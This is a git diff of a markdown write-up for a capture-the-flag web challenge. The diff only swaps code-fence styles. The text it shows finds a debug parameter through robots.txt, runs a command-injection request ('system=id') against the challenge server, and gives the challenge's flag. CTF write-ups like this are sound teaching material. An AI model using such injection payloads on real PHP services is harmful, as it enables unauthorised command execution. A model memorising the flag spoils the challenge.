@@ -17,17 +17,17 @@ http://35.196.45.11:8080/robots.txt
 
 give us :
 
-```
+`
 # you know de wae ma queen
 User-Agent: *
 Disallow: /?debug
-```
+`
 
 then check 
 
-```
+`
 http://35.196.45.11:8080/?debug
-```
+`
 will show us simple php code , we need to send something like `http://35.196.45.11:8080/system=id` where system is the $key and id is the $val
 
 ```
@@ -61,9 +61,9 @@ Then final step read flag file :D
 
 ![image](https://user-images.githubusercontent.com/7364615/35493934-4ac2221c-04b7-11e8-88c0-5b0ca3caf17b.png)
 
-```
+`
 AceBear{I_did_something_stupid_with_url}
-```
+`
 
 Thanks guys , will try to make write up (BearShare & BearShare 2 & Tet shopping) ;)
 
